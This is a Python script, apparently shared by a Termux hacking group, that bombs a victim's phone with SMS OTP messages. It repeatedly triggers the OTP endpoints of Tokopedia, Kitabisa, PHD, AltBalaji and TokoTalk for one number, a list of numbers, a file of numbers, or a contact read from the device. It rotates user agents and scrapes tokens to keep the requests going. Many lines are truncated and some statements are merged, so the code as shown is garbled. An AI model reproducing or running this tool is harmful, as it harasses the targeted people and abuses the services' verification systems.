#!/usr/bin/python
import requests,random,json,time,sys,os,re
# -------------------------------------------------------->
# Tidak ada author Untuk Sc ini kecuali ./Kitsune yg Telah>
# Update 26 january 2020 21:57
# Recode!, dosa Tanggung Sendiri
# Thanks For MyFriends, FourX, MhankBarBar, Maulana, Rexy
# Underground Science And Termux Tutorial Group
# -------------------------------------------------------->

# -----------------------WARNA----------------------------
p = '\x1b[0m'
m = '\x1b[91m'
h = '\x1b[92m'
k = '\x1b[93m'
b = '\x1b[94m'
u = '\x1b[95m'
bm = '\x1b[96m'
bgm = '\x1b[41m'
bgp = '\x1b[47m'
res = '\x1b[40m'
# -------------------------------------------------------
# Sebuah Program Python Yg Menggunakan Program Berorientas>
#------------------------Classes------------------------
class spam:

        def __init__(self, nomer):
                self.nomer = nomer

        def spam(self):
                hasil=requests.get(f'https://core.ktbs.io/>if hasil.status_code == 200:
                        return f'\x1b[92mSpamm kitabisa {s>
                elif hasil.status_code == 500:
                        return f'\x1b[91mSpamm kitabisa {s>

        def tokped(self):
                rands=random.choice(open('ua.txt').readlin>
                kirim = {
                        'User-Agent' : rands,
                        'Accept-Encoding' : 'gzip, deflate>
                        'Connection' : 'keep-alive',
                        'Origin' : 'https://accounts.tokop>
                        'Accept' : 'application/json, text>
                        'X-Requested-With' : 'XMLHttpReque>
                        'Content-Type' : 'application/x-ww>
                }
                regist = requests.get('https://accounts.to>
                Token = re.search(r'\<input\ id=\"Token\"\>
                formulir = {
                        "otp_type" : "116",
                        "msisdn" : self.nomer,
                        "tk" : Token,
                        "email" : '',
                        "original_param" : "",
                        "user_id" : "",
                        "signature" : "",
                        "number_otp_digit" : "6"
                }
                req = requests.post('https://accounts.toko>
                if 'Anda sudah melakukan 3 kali pengiriman>
                        return f'\x1b[91mSpamm Tokped {sel>
                else:
                        return f'\x1b[92mSpamm Tokped {sel>

        def phd(self):
                param = {'phone_number':self.nomer}
                r = requests.post('https://www.phd.co.id/e>
                if 'We have sent an OTP to your phone, Ple>
                        return f'\x1b[92mSpamm PHD {self.n>
                else:
                        return f'\x1b[91mSpamm PHD {self.n>

        def balaji(self):
                urlb="https://api.cloud.altbalaji.com/acco>
                kod="62"
                ata={ata={
                                "country_code":kod,
                                "phone_number":self.nomer
                        }
                head={
                        "Content-Length":f"{len(str(ata))}>
                        "Accept":"application/json, text/p>
                        "Origin":"https://lite.altbalaji.c>
                        "Save-Data":"on",
                        "User-Agent":"Mozilla/5.0 (Linux; >
                        "Content-Type":"application/json;c>
                        "Referer":"https://lite.altbalaji.>
                        "Accept-Encoding":"gzip, deflate, >
                        "Accept-Language":"en-IN,en;q=0.9,>
                        }
                req=requests.post(urlb,data=json.dumps(ata>
                if '{"status":"ok"}' in req.text:
                        return f'\x1b[92mSpamm BALAJI {sel>
                else:
                        return f'\x1b[92mSpamm BALAJI {sel>
        def TokoTalk(self):
                data='{"key":"phone","value":"'+str(self.n>
                head={
                        "User-Agent":"Mozilla/5.0 (X11; Li>
                        "content-type":"application/json;c>
                }
                if 'expireAt' in requests.post("https://ap>
                        return f'\x1b[92mSpamm TokoTalk {s>
                else:
                        return f'\x1b[92mSpamm TokoTalk {s>
# -------------------------------------------------------->

# ---------------------------Fungsi----------------------->
def apakah():
        while True:
                lan=str(input(k+'\tWant more? y/n : '+h))
                if( lan == 'y' or lan == 'Y'):
                        jnspam()
                elif(lan == 'n' or lan == 'N'):
                        print(p)
                        break
                else:
                        continue
def files():
        fil=str(input(k+'\tFile : '+h))if fil in os.listdir(os.getcwd()):
                l=open(fil,'r').readlines()
                js=int(input(k+'\tTotal spam : '+h))
                dly=int(input(k+'\tDelay : '+h))
                for pp in range(js):
                        for d in range(len(l)-1):
                                io=l[d].split('\n')[0]
                                z=spam(io)
                                if jns == 'ktbs':
                                        print('\t'+z.spam(>
                                elif jns == 'tkpd':
                                        print('\t'+z.tokpe>
                                elif jns == 'blji':
                                        print('\t'+z.balaj>
                                elif jns == 'smua':
                                        print('\t'+z.spam(>
                                        print('\t'+z.tokpe>
                                        print('\t'+z.balaj>
                                        print('\t'+z.phd())
                                        print('\t'+z.TokoT>
                                elif jns == 'pehd':
                                        print('\t'+z.phd())
                                elif jns == 'ttk':
                                        print('\t'+z.TokoT>
                                else:
                                        print()
                                time.sleep(dly)
                apakah()
        else:
                print(m+f'\tFile {fil} doesn`t exist')
def single():
        nomer=str(input(k+'\tPhone number : '+h))
        jm=int(input(k+'\tTotal spam : '+h))
        dly=int(input(k+'\tDelay : '+h))
        for oo in range(jm):
                z=spam(nomer)
                if jns == 'ktbs':
                        print('\t'+z.spam())
                elif jns == 'tkpd':
                        print('\t'+z.tokped())
                elif jns == 'blji':
                        print('\t'+z.balaji())
                elif jns == 'smua':
                        print('\t'+z.spam())
                        print('\t'+z.tokped()print('\t'+z.balaji())
                        print('\t'+z.phd())
                        print('\t'+z.TokoTalk())
                elif jns == 'pehd':
                        print('\t'+z.phd())
                elif jns == 'ttk':
                        print('\t'+z.TokoTalk())
                else:
                        print()
                time.sleep(dly)
        apakah()
def multi():
        nomer=[]
        jum=int(input(k+'\tTotal number : '+h))
        for i in range(jum):
                nomer.append(str(input(k+f'\tNumber -{i+1}>
        spm=int(input(k+'\tTotal spam : '+h))
        dly=int(input(k+'Delay : '+h))
        kk=len(nomer)
        for i in range(spm):
                for ss in range(kk):
                        z=spam(nomer[ss])
                        if jns == 'ktbs':
                                print('\t'+z.spam())
                        elif jns == 'tkpd':
                                print('\t'+z.tokped())
                        elif jns == 'blji':
                                print('\t'+z.balaji())
                        elif jns == 'smua':
                                print('\t'+z.spam())
                                print('\t'+z.tokped())
                                print('\t'+z.balaji())
                                print('\t'+z.phd())
                                print('\t'+z.TokoTalk())
                        elif jns == 'pehd':
                                print('\t'+z.phd())
                        elif jns == 'ttk':
                                print('\t'+z.TokoTalk())
                        else:
                                print()
                time.sleep(dly)
        apakah()
#-------------------------Fungsi Banner------------------->
def logo():
        os.system('clear')
        auth=m+'  Author : '+k+'./kitsune'# jika ingin m3namambah kan variabel dan mengubah >
        return '''
%s  _____     _ _    _  ___   ___ ______
%s |  __ \   | | |  | |/ _ \ / _ \____  |
%s | |__) |__| | |__| | | | | | | |  / /
%s |  _  // _` |  __  | | | | | | | / /
%s | | \ \ (_| | |  | | |_| | |_| |/ /
%s |_|  \_\__,_|_|  |_|\___/ \___//_/
%s```% (k,m,h,k,m,h,k,m,h,k,m,h,k,m,h,k,m,h,k,m,h,k,m,h,k>
# -------------------------------------------------------->
def termux():
        os.system('termux-contact-list > .contact')
        po=json.loads(open('.contact','r').read())
        lenpo=len(po)
        for poh in range(lenpo):
                print(m+str(poh+1)+' '+k+po[poh]['name'])
        nj=po[int(input(u+'\tchoose > '+h))-1]['number']
        dly=int(input(u+'\tDelay > '+h))
        for w in range(int(input(u+'\tTotal spam : '+h))):
                z=spam(nj)
                if jns == 'ktbs':
                        print('\t'+z.spam())
                elif jns == 'tkpd':
                        print('\t'+z.tokped())
                elif jns == 'blji':
                        print('\t'+z.balaji())
                elif jns == 'smua':
                        print('\t'+z.spam())
                        print('\t'+z.tokped())
                        print('\t'+z.balaji())
                        print('\t'+z.phd())
                        print('\t'+z.TokoTalk())
                elif jns == 'pehd':
                        print('\t'+z.phd())
                elif jns == 'ttk':
                        print('\t'+z.TokoTalk())
                time.sleep(dly)
        apakah()
def main():
        print(logo())
        print(b+'╔══════════════════════════════\n'+b+'║'+>
        pil=str(input(b+'╚══'+m+'〙'+u+'Mode'+m+' ▶ '+h))
        if( pil == '1' or pil == '01'):single()
        elif( pil == '2' or pil == '02'):
                multi()
        elif( pil == '3' or pil == '03'):
                files()
        elif( pil == '4' or pil == '04'):
                termux()
        elif( pil == '0' or pil == '00'):
                jnspam()
        else:
                print(m+'             Don`t leave it blank>
                time.sleep(2)
                main()
def jnspam():
        global jns
        print(logo())
        print(b+'╔══════════════════════════════\n'+b+'║'+>
        while True:
                oy=str(input(b+'╚══'+m+'〙'+u+'Spam'+m+' ▶>
                if( oy == '1' or oy == '01' ):
                        jns='smua'
                        break
                elif( oy == '2' or oy == '02' ):
                        jns='pehd'
                        break
                elif( oy == '3' or oy == '03' ):
                        jns='ktbs'
                        break
                elif( oy == '4' or oy == '04' ):
                        jns='tkpd'
                        break
                elif( oy == '5' or oy == '05' ):
                        jns='ttk'
                        break
                elif( oy == '6' or oy == '06' ):
                        jns='blji'
                        break
                elif( oy == '0' or oy == '00' ):
                        sys.exit()
                else:
                        print(m+'             Don`t leave >
                        continue
        main()
if __name__ == '__main__':
        jnspam()
